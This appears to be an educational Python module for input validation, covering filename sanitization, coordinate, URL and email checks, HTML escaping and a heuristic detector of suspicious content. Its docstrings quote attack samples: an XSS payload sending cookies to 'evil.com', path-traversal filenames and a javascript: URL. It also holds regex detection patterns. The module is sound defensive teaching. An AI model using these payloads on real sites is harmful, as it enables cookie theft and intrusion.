"""
Input Validation and Sanitization

EDUCATIONAL: Input Validation Security
======================================

Why Validate Input?
------------------
1. SECURITY: Prevent injection attacks (SQL, XSS, command)
2. DATA INTEGRITY: Ensure valid data in database
3. USER EXPERIENCE: Helpful error messages
4. RELIABILITY: Prevent crashes from malformed data

Validation Layers:
-----------------
1. Type validation (Pydantic handles this)
2. Format validation (regex patterns, length limits)
3. Business logic validation (coordinates on Earth, valid dates)
4. Sanitization (remove dangerous characters)
5. Content validation (no malicious content)

Defense in Depth:
----------------
Validate at multiple points:
- Client-side: Fast feedback (but easily bypassed!)
- API layer: Pydantic schemas
- Service layer: Business logic
- Database layer: Constraints

NEVER trust client-side validation alone!
Attackers can bypass it with direct API calls.

Common Injection Attacks:
------------------------
1. SQL Injection: Malicious SQL in inputs
2. XSS: Malicious JavaScript in content
3. Command Injection: Shell commands in inputs
4. Path Traversal: Access files outside allowed directory
5. LDAP Injection: Manipulate directory queries
6. XML Injection: Malicious XML content
"""

from pydantic import validator, root_validator
from typing import Optional, List
from pathlib import Path
import re
import html
import logging

logger = logging.getLogger(__name__)


# =============================================================================
# FILENAME SANITIZATION
# =============================================================================

def sanitize_filename(filename: str) -> str:
    """
    Sanitize filename to prevent path traversal and injection.
    
    EDUCATIONAL: Path Traversal Attack
    ----------------------------------
    Attacker tries to access files outside upload directory:
    
    Malicious filename: "../../../etc/passwd"
    Without sanitization: Files saved to /etc/passwd!
    
    Malicious filename: "..\\..\\..\\windows\\system32\\config"
    Without sanitization: Access Windows system files!
    
    Prevention:
    1. Remove directory separators (/, \\)
    2. Remove parent directory reference (..)
    3. Only allow safe characters
    4. Limit length
    
    Args:
        filename: User-provided filename
        
    Returns:
        str: Sanitized filename safe for storage
        
    Example:
        >>> sanitize_filename("../../../etc/passwd")
        'etcpasswd'
        >>> sanitize_filename("photo.jpg")
        'photo.jpg'
        >>> sanitize_filename("My Photo (1).jpg")
        'My_Photo_1.jpg'
    """
    if not filename:
        return "unnamed"
    
    # Step 1: Get only the filename (remove any path components)
    # This handles both forward and backslashes
    filename = Path(filename).name
    
    # Step 2: Remove directory traversal attempts
    filename = filename.replace("..", "")
    filename = filename.replace("/", "")
    filename = filename.replace("\\", "")
    
    # Step 3: Remove null bytes (can truncate filenames in some systems)
    filename = filename.replace("\x00", "")
    
    # Step 4: Replace spaces and special chars with underscores
    # Allow: alphanumeric, dot, dash, underscore
    filename = re.sub(r'[^a-zA-Z0-9._-]', '_', filename)
    
    # Step 5: Remove multiple consecutive dots (security measure)
    filename = re.sub(r'\.{2,}', '.', filename)
    
    # Step 6: Ensure doesn't start with dot (hidden files on Linux)
    if filename.startswith('.'):
        filename = '_' + filename[1:]
    
    # Step 7: Limit length (filesystem limits)
    max_length = 255
    if len(filename) > max_length:
        # Keep extension, truncate name
        name, ext = filename.rsplit('.', 1) if '.' in filename else (filename, '')
        max_name_length = max_length - len(ext) - 1 if ext else max_length
        filename = name[:max_name_length] + ('.' + ext if ext else '')
    
    # Step 8: Handle empty result
    if not filename or filename == '.' or filename == '_':
        return "unnamed"
    
    return filename


# =============================================================================
# COORDINATE VALIDATION
# =============================================================================

def validate_latitude(lat: float) -> float:
    """
    Validate latitude coordinate.
    
    EDUCATIONAL: Geographic Coordinates
    -----------------------------------
    Latitude: North/South position (-90 to 90)
    - 0° = Equator
    - 90° = North Pole
    - -90° = South Pole
    
    Longitude: East/West position (-180 to 180)
    - 0° = Prime Meridian (Greenwich)
    - 180° = International Date Line
    
    Common mistakes:
    - Swapping lat/lon
    - Using degrees/minutes/seconds instead of decimal
    - Out of range values
    
    Args:
        lat: Latitude in decimal degrees
        
    Returns:
        float: Validated latitude
        
    Raises:
        ValueError: If latitude is invalid
    """
    if not isinstance(lat, (int, float)):
        raise ValueError(f"Latitude must be a number, got {type(lat).__name__}")
    
    if lat < -90 or lat > 90:
        raise ValueError(f"Latitude must be between -90 and 90, got {lat}")
    
    return float(lat)


def validate_longitude(lon: float) -> float:
    """Validate longitude coordinate."""
    if not isinstance(lon, (int, float)):
        raise ValueError(f"Longitude must be a number, got {type(lon).__name__}")
    
    if lon < -180 or lon > 180:
        raise ValueError(f"Longitude must be between -180 and 180, got {lon}")
    
    return float(lon)


def validate_coordinates(lat: float, lon: float) -> tuple:
    """
    Validate coordinate pair.
    
    Args:
        lat: Latitude
        lon: Longitude
        
    Returns:
        tuple: (validated_lat, validated_lon)
        
    Raises:
        ValueError: If coordinates are invalid
    """
    return (validate_latitude(lat), validate_longitude(lon))


# =============================================================================
# TEXT SANITIZATION
# =============================================================================

def sanitize_html(text: str) -> str:
    """
    Escape HTML special characters to prevent XSS.
    
    EDUCATIONAL: XSS Prevention
    --------------------------
    Cross-Site Scripting: Injecting malicious JavaScript
    
    Attack:
    User input: "<script>document.location='evil.com?c='+document.cookie</script>"
    Displayed on page without escaping → Runs in all users' browsers!
    Steals cookies + session tokens.
    
    Prevention:
    Escape HTML entities:
    < → &lt;
    > → &gt;
    & → &amp;
    " → &quot;
    ' → &#x27;
    
    Browser displays: "<script>..." (as text, not code)
    
    Args:
        text: Potentially dangerous text
        
    Returns:
        str: HTML-escaped safe text
        
    Example:
        >>> sanitize_html("<script>evil()</script>")
        '&lt;script&gt;evil()&lt;/script&gt;'
    """
    if not text:
        return text
    
    return html.escape(text)


def sanitize_text_input(
    text: str,
    max_length: int = 1000,
    allow_html: bool = False,
    strip_whitespace: bool = True
) -> str:
    """
    Sanitize text input with multiple protections.
    
    Args:
        text: User input text
        max_length: Maximum allowed length
        allow_html: If False, escape HTML entities
        strip_whitespace: Strip leading/trailing whitespace
        
    Returns:
        str: Sanitized text
    """
    if not text:
        return ""
    
    # Strip whitespace
    if strip_whitespace:
        text = text.strip()
    
    # Remove null bytes (can cause issues in C-based systems)
    text = text.replace("\x00", "")
    
    # Escape HTML if not allowed
    if not allow_html:
        text = sanitize_html(text)
    
    # Truncate to max length
    if len(text) > max_length:
        text = text[:max_length]
    
    # Normalize Unicode to prevent homograph attacks
    # (e.g., using Cyrillic 'а' that looks like Latin 'a')
    import unicodedata
    text = unicodedata.normalize('NFKC', text)
    
    return text


# =============================================================================
# URL VALIDATION
# =============================================================================

def validate_url(url: str, allowed_schemes: List[str] = None) -> str:
    """
    Validate and sanitize URL.
    
    EDUCATIONAL: URL-Related Attacks
    --------------------------------
    1. Open Redirect: Trick users into visiting malicious sites
       Vulnerable: redirect.php?url=http://evil.com
       
    2. SSRF (Server-Side Request Forgery): Server fetches attacker URL
       Attack: Fetch internal services (localhost, metadata endpoints)
       
    3. Protocol abuse: Use javascript:, data:, file: schemes
       Example: javascript:alert('XSS')
    
    Prevention:
    - Validate scheme (only http/https)
    - Block internal IPs (127.0.0.1, 10.x.x.x, etc.)
    - Validate against allowlist of domains
    
    Args:
        url: URL to validate
        allowed_schemes: List of allowed schemes (default: ['http', 'https'])
        
    Returns:
        str: Validated URL
        
    Raises:
        ValueError: If URL is invalid or uses disallowed scheme
    """
    from urllib.parse import urlparse
    
    if not url:
        raise ValueError("URL cannot be empty")
    
    allowed_schemes = allowed_schemes or ['http', 'https']
    
    try:
        parsed = urlparse(url)
    except Exception as e:
        raise ValueError(f"Invalid URL format: {e}")
    
    # Check scheme
    if parsed.scheme not in allowed_schemes:
        raise ValueError(
            f"URL scheme '{parsed.scheme}' not allowed. "
            f"Allowed: {allowed_schemes}"
        )
    
    # Check for dangerous schemes
    dangerous_schemes = ['javascript', 'data', 'file', 'vbscript']
    if parsed.scheme.lower() in dangerous_schemes:
        raise ValueError(f"Dangerous URL scheme: {parsed.scheme}")
    
    # Check for internal/localhost URLs (SSRF prevention)
    if parsed.hostname:
        hostname = parsed.hostname.lower()
        internal_patterns = [
            'localhost',
            '127.0.0.1',
            '0.0.0.0',
            '::1',
            '169.254.',  # Link-local
            '10.',       # Private network
            '172.16.', '172.17.', '172.18.', '172.19.',
            '172.20.', '172.21.', '172.22.', '172.23.',
            '172.24.', '172.25.', '172.26.', '172.27.',
            '172.28.', '172.29.', '172.30.', '172.31.',
            '192.168.',  # Private network
        ]
        
        for pattern in internal_patterns:
            if hostname.startswith(pattern) or hostname == pattern:
                raise ValueError(f"Internal URLs are not allowed: {hostname}")
    
    return url


# =============================================================================
# EMAIL VALIDATION
# =============================================================================

def validate_email(email: str) -> str:
    """
    Validate email address format.
    
    EDUCATIONAL: Email Validation
    ----------------------------
    Email format (simplified):
    local-part@domain
    
    Rules:
    - Local part: letters, numbers, special chars (with quotes)
    - Domain: letters, numbers, dots, hyphens
    - Max 254 characters total (RFC 5321)
    
    Perfect email validation is complex (RFC 5322).
    Best approach: Basic format check + send confirmation email.
    
    Args:
        email: Email address to validate
        
    Returns:
        str: Validated and normalized email
        
    Raises:
        ValueError: If email format is invalid
    """
    if not email:
        raise ValueError("Email cannot be empty")
    
    # Normalize
    email = email.strip().lower()
    
    # Length check
    if len(email) > 254:
        raise ValueError("Email too long (max 254 characters)")
    
    # Basic format check
    email_pattern = re.compile(
        r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    )
    
    if not email_pattern.match(email):
        raise ValueError("Invalid email format")
    
    return email


# =============================================================================
# PYDANTIC VALIDATORS FOR REUSE
# =============================================================================

class InputValidators:
    """
    Reusable Pydantic validators.
    
    Usage in schemas:
        class LocationCreate(BaseModel):
            notes: Optional[str] = None
            
            _sanitize_notes = validator('notes', pre=True, allow_reuse=True)(
                InputValidators.sanitize_text
            )
    """
    
    @staticmethod
    def sanitize_text(v: str) -> str:
        """Sanitize text input"""
        if v is None:
            return v
        return sanitize_text_input(v, max_length=1000)
    
    @staticmethod
    def sanitize_filename(v: str) -> str:
        """Sanitize filename"""
        if v is None:
            return v
        return sanitize_filename(v)
    
    @staticmethod
    def validate_latitude(v: float) -> float:
        """Validate latitude"""
        return validate_latitude(v)
    
    @staticmethod
    def validate_longitude(v: float) -> float:
        """Validate longitude"""
        return validate_longitude(v)


# =============================================================================
# CONTENT SECURITY
# =============================================================================

def detect_suspicious_content(text: str) -> List[str]:
    """
    Detect potentially malicious content in text.
    
    EDUCATIONAL: Content Security
    ----------------------------
    Sometimes you can't fully sanitize (e.g., rich text editors).
    At minimum, detect and flag suspicious content for review.
    
    Suspicious patterns:
    - Script tags: <script>, javascript:
    - Event handlers: onclick, onerror, onload
    - SQL keywords: SELECT, DROP, INSERT
    - Path traversal: ../, ..\\
    - Shell commands: $(, `command`
    
    Note: This is heuristic-based and can have false positives/negatives.
    Use in combination with other protections.
    
    Args:
        text: Text to analyze
        
    Returns:
        List[str]: List of detected suspicious patterns
    """
    if not text:
        return []
    
    text_lower = text.lower()
    suspicious = []
    
    patterns = {
        'script_tag': r'<\s*script',
        'event_handler': r'on\w+\s*=',
        'javascript': r'javascript\s*:',
        'sql_injection': r'\b(select|insert|update|delete|drop|union)\b.*\b(from|into|set|table)\b',
        'path_traversal': r'\.\./|\.\.\\',
        'shell_command': r'\$\(.*\)|`.*`',
        'iframe': r'<\s*iframe',
        'object_embed': r'<\s*(object|embed)',
    }
    
    for name, pattern in patterns.items():
        if re.search(pattern, text_lower, re.IGNORECASE):
            suspicious.append(name)
            logger.warning(f"Suspicious content detected: {name}")
    
    return suspicious
